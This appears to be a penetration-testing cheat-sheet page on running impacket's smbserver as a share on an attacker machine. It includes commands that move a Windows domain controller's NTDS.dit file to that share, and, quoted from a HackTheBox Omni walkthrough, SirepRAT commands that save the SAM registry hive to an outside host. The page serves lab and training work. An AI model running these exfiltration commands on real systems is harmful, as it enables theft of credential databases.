---
title: smbserver - from impacket
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - pentesting windows 
  - server
  - impacket
---

# smbserver - from impacket

Simple SMB Server example. [See impacket](impacket.md).


## Installation

Download from: [https://github.com/fortra/impacket/blob/master/examples/smbserver.py](https://github.com/fortra/impacket/blob/master/examples/smbserver.py)


## Basic usage

### Create a share server in attacker machine and connect from victim's

Launch smbserver in our attacker machine:

```bash
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/username/Documents/
```

Also you can launch it with username and password:

```bash
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/username/Documents/ -username "username" -password "agreatpassword"
```



Now, from PS in the victim's windows machine we could upload a folder to the shared folder in the attacker machine just by running:

```powershell
cmd.exe /c move C:\NTDS\NTDS.dit \\$ip\CompData
```


Sidenote: see [the HackTheBox machine Omni](htb-omni.md), which uses [SirepRAT](sireprat.md) to upload files to the share. A taste of it:

```bash
# First crate the shared. After that, establish the connection:
python ~/tools/SirepRAT/SirepRAT.py $ip LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args ' /c net use \\10.10.14.2\CompData /u:username agreatpassword'

# Now copy files to the share. In this case we are dumping Hives 
python ~/tools/SirepRAT/SirepRAT.py $ip LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args ' /c reg save HKLM\sam \
\10.10.14.2\CompData\sam'
```


